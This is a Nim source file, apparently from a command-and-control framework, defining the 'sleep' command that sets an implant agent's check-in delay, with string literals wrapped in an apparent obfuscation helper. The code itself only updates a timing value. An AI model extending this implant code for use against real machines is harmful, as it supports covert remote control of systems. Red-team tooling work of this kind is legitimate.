import ../common/[types, utils]

# Define function prototype
proc executeSleep(ctx: AgentCtx, task: Task): TaskResult 

# Command definition (as seq[Command])
let commands* = @[
    Command(
        name: protect("sleep"),
        commandType: CMD_SLEEP,
        description: protect("Update sleep delay configuration."),
        example: protect("sleep 5"),
        arguments: @[
            Argument(name: protect("delay"), description: protect("Delay in seconds."), argumentType: INT, isRequired: true)
        ],
        execute: executeSleep
    )
]

# Implement execution functions
when defined(server):
    proc executeSleep(ctx: AgentCtx, task: Task): TaskResult = nil

when defined(agent): 

    import os, strutils, strformat
    import ../agent/protocol/result
    import ../common/utils

    proc executeSleep(ctx: AgentCtx, task: Task): TaskResult = 

        try: 
            # Parse task parameter
            let delay = int(Bytes.toUint32(task.args[0].data))

            # Updating sleep in agent context
            echo fmt"   [>] Setting sleep delay to {delay} seconds."
            ctx.sleep = delay
                    
            return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])

        except CatchableError as err: 
            return createTaskResult(task, STATUS_FAILED, RESULT_STRING, string.toBytes(err.msg))
